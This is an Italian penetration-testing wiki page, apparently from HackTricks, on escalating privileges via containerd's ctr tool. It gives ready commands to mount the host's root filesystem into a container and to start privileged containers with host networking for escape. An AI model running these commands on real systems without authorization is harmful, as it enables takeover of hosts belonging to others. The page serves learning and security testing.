# Privilege Escalation di Containerd (ctr)

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Vai al seguente link per scoprire **dove `containerd` e `ctr` si collocano nello stack dei container**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Se scopri che un host contiene il comando `ctr`, la CLI nativa inclusa in containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Puoi elencare le immagini note a containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Quindi **esegui una di quelle immagini con la root dell'host montata tramite bind ricorsivo nella root del container**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Esegui un container in modalità privilegiata e verifica la possibilità di un escape.\
Puoi eseguire un container privilegiato utilizzando il networking dell'host come:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` concede al processo le Linux capabilities effettive del caller e rimuove diversi controlli di isolamento, ma un escape rimane dipendente dall'ambiente; usa le tecniche menzionate nella pagina seguente per verificarne la presenza:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Come iniziare con containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implementazione del comando `ctr image`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implementazione del comando `ctr run`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Documentazione dei shared-subtree del kernel Linux](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Pacchetto OCI di containerd: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Flag del comando `ctr` di containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
